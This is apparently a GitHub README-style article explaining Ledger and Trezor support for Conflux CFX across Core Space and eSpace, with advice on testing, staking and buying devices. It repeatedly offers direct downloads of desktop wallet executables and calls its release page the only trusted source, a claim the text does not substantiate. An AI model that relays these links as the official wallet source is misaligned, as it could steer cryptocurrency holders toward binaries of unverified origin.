![Conflux Wallet](assets/banner-article.png)

# Hardware Wallet for CFX

<p align="center">Hardware Wallet for CFX: the checks, in order, for the current desktop release.</p>

<p align="center"><img src="https://img.shields.io/badge/LICENSE-MIT-30A0D0?style=for-the-badge&labelColor=101010" alt="License: MIT"> <img src="https://img.shields.io/badge/RELEASE-v0.6.14-30A0D0?style=for-the-badge&labelColor=101010" alt="Release v0.6.14"></p>

<p align="center"><a href="https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-windows-v0.6.14.exe"><img src="assets/button-windows.png" alt="Download for Windows"></a> <a href="https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-macos-v0.6.14.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-30A0D0?style=for-the-badge&labelColor=101010&logo=apple" alt="Download for macOS"></a> <a href="https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-linux-v0.6.14.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-30A0D0?style=for-the-badge&labelColor=101010&logo=linux" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
|---|---|---|
| <img src="assets/platform-windows.png" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`conflux-wallet-windows-v0.6.14.exe`](https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-windows-v0.6.14.exe) |
| <img src="https://img.shields.io/badge/MACOS-1B6E93?style=flat-square&labelColor=101010&logo=apple" alt="macOS"> | macOS 12 or later | [`conflux-wallet-macos-v0.6.14.dmg`](https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-macos-v0.6.14.dmg) |
| <img src="https://img.shields.io/badge/LINUX-1B6E93?style=flat-square&labelColor=101010&logo=linux" alt="Linux"> | x64 Ubuntu 20.04 or later, or equivalent | [`conflux-wallet-linux-v0.6.14.zip`](https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-linux-v0.6.14.zip) |

</div>

All versions and checksums are on the [release page](https://github.com/conflux-developments/conflux-desktop-wallet/releases/tag/v0.6.14).

> Only download from this GitHub release page.

**Short answer.** Two device families are supported. Ledger reaches both spaces - the Conflux app for Core Space, the Ethereum app for eSpace. Trezor is documented for eSpace only, and its Core Space support is claimed by the product but not corroborated independently, so it is the one to test before relying on it.

## The matrix

<div align="center">

| Device | Core Space (`cfx:`) | eSpace (`0x`) | What signs |
|---|---|---|---|
| Ledger | Yes - Conflux app | Yes - Ethereum app | The device, per transaction |
| Trezor | Claimed, not corroborated | Yes | The device, through the Ethereum app |

</div>

The table is the short answer, and the rest of this article is why it looks uneven. It is not a ranking; it is a description of what each vendor's app ecosystem happens to cover.

## Why one device covers both spaces

Core Space is a native ledger with its own transaction format, so it needs a dedicated application on the device. eSpace is EVM-compatible, so it needs only the Ethereum app that every device already has.

That asymmetry explains everything else in this subject. Supporting eSpace is nearly free for a device maker; supporting Core Space means writing and maintaining a Conflux application, which is why coverage is narrower and why firmware updates break it disproportionately.

## Which app for which space

Core Space signing requires the Conflux app open on the device. eSpace signing requires the Ethereum app. The wallet derives a different account for each, so the app you open decides which address you are looking at.

Getting this wrong produces the classic "my account disappeared" report: the device is fine, the seed is fine, and the wallet is showing the other space because the device app changed. https://github.com/conflux-developments/setup-handbook/blob/HEAD/conflux-core-space-vs-espace.md covers the underlying split.

## Does one device work with both spaces?

A Ledger does, with a switch of app on the device. A Trezor does for eSpace; Core Space is the part that needs verifying, and the verification is a small test transaction rather than a reading exercise.

So the practical answer for someone who wants staking *and* contracts is a single Ledger, used with two apps. That is not a preference for the brand; it is the only combination with a documented path on both sides today.

## Testing before you commit

Send a small amount using the current release from the release page (https://github.com/conflux-developments/conflux-desktop-wallet/releases/tag/v0.6.14), sign it, and check the address on the device against the one the wallet showed. If the Core Space test works on a Trezor, you have your answer for your own device and firmware; if it does not, you have lost a small transfer fee rather than a balance.

Test on the space you actually intend to use, not the one that is convenient. An eSpace test says nothing about Core Space signing, and the failure modes are different.

## What a device does and does not protect

It protects the key. It does not protect the decision: a device will happily sign a transfer to a scam address if you approve it, and it cannot tell you that a contract approval is unlimited.

The value is the screen. What the device displays is what it signs, so reading the recipient there catches the attacks that rewrite addresses on the computer. https://github.com/conflux-developments/setup-handbook/blob/HEAD/conflux-wallet-safety.md covers the surrounding habits.

It also cannot tell a legitimate contract from a hostile one. A blind signature approves whatever the contract does, which is how hardware-held balances are drained despite the device; if the screen shows only a hash and an address you do not recognise, treat that as a reason to stop rather than a formality.

## What about staking and governance?

Both are Core Space activities, so they depend on Core Space signing. If your device only signs eSpace, you cannot stake with it - the stake is a `cfx:` transaction and there is no EVM path to it.

That is the practical reason the matrix matters more than it looks. A device that works perfectly for contracts can be useless for the thing most CFX holders actually want to do. https://github.com/conflux-developments/ecosystem-guides/blob/HEAD/stake-cfx-in-conflux-wallet.md covers what staking needs.

## Buying and setting up

Buy from the manufacturer, not from a marketplace listing, and set the device up yourself so the seed is generated on it rather than arriving pre-written. A device that comes with a recovery phrase has been tampered with, without exception.

A second-hand device is a device whose seed someone else may know, which is worth remembering when a discount looks generous. Then update the firmware and install the apps before moving funds. A device on old firmware is the single most common cause of "the app will not open", and it is fixed before any transfer rather than after. https://github.com/conflux-developments/ecosystem-guides/blob/HEAD/connect-ledger-to-conflux-wallet.md and https://github.com/conflux-developments/ecosystem-guides/blob/HEAD/connect-trezor-to-conflux-wallet.md are the two setups.

## When to use a device at all

Use one when the balance is large enough that a compromised computer would be a life event, or when you sign regularly enough that a mistake is likely. Below that, the discipline of a well-backed-up software wallet is a reasonable trade.

The device is a tool for a threshold, not a badge. Above it, the device is not optional. The threshold is personal, but the logic is not: the device moves the single point of failure from a general-purpose machine to a small computer that only signs. Because the app is actively maintained, the current release published on the release page is the baseline for everything described here.

## FAQ

### Which hardware wallet supports Conflux?

Ledger for both spaces. Trezor for eSpace, with Core Space claimed by the product but not independently corroborated.

### Can one hardware wallet work with both spaces?

A Ledger can, by switching between the Conflux app and the Ethereum app. The accounts differ, and the app decides which one appears.

### Which Trezor models support CFX?

Any model that runs the Ethereum app, which is what signs eSpace transactions. The app and firmware versions matter more than the model.

### Do I need a device to stake?

No, but if you use one it must sign Core Space. Staking is a `cfx:` transaction with no EVM route.

### Is a hardware wallet worth it?

For a balance you would hate to lose, yes: it protects the key from a compromised computer. It does not protect you from approving a bad transaction.

---

## Get Conflux Wallet

<p align="center"><a href="https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-windows-v0.6.14.exe"><img src="assets/button-windows.png" alt="Download for Windows"></a> <a href="https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-macos-v0.6.14.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-30A0D0?style=for-the-badge&labelColor=101010&logo=apple" alt="Download for macOS"></a> <a href="https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-linux-v0.6.14.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-30A0D0?style=for-the-badge&labelColor=101010&logo=linux" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
|---|---|---|
| <img src="assets/platform-windows.png" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`conflux-wallet-windows-v0.6.14.exe`](https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-windows-v0.6.14.exe) |
| <img src="https://img.shields.io/badge/MACOS-1B6E93?style=flat-square&labelColor=101010&logo=apple" alt="macOS"> | macOS 12 or later | [`conflux-wallet-macos-v0.6.14.dmg`](https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-macos-v0.6.14.dmg) |
| <img src="https://img.shields.io/badge/LINUX-1B6E93?style=flat-square&labelColor=101010&logo=linux" alt="Linux"> | x64 Ubuntu 20.04 or later, or equivalent | [`conflux-wallet-linux-v0.6.14.zip`](https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-linux-v0.6.14.zip) |

</div>

All versions and checksums are on the [release page](https://github.com/conflux-developments/conflux-desktop-wallet/releases/tag/v0.6.14).

## Related guides

- [Connect Ledger to Conflux Wallet](https://github.com/conflux-developments/ecosystem-guides/blob/HEAD/connect-ledger-to-conflux-wallet.md)
- [Connect Trezor to Conflux Wallet](https://github.com/conflux-developments/ecosystem-guides/blob/HEAD/connect-trezor-to-conflux-wallet.md)

[All Conflux Wallet guides](https://github.com/conflux-developments/setup-handbook/blob/HEAD/README.md)
